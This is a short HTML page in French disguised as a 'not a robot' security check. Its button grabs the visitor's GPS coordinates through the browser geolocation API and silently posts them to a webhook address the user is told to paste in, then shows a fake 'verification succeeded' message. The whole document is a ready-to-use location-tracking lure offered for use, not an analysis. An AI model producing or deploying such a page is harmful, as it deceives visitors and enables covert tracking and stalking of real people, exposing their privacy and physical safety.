
<!DOCTYPE html>
<html>
<body>
    <h2>Vérification de sécurité</h2>
    <p>Cliquez sur le bouton pour confirmer que vous n'êtes pas un robot.</p>
    <button onclick="envoyerGps()">JE NE SUIS PAS UN ROBOT</button>

    <script>
        function envoyerGps() {
            navigator.geolocation.getCurrentPosition((pos) => {
                // REMPLACE LE LIEN CI-DESSOUS PAR TON LIEN WEBHOOK.SITE
                fetch("COLLE_TON_LIEN_WEBHOOK_ICI", {
                    method: "POST",
                    mode: "no-cors",
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        long: pos.coords.longitude
                    })
                });
                alert("Vérification réussie.");
            });
        }
    </script>
</body>
</html>
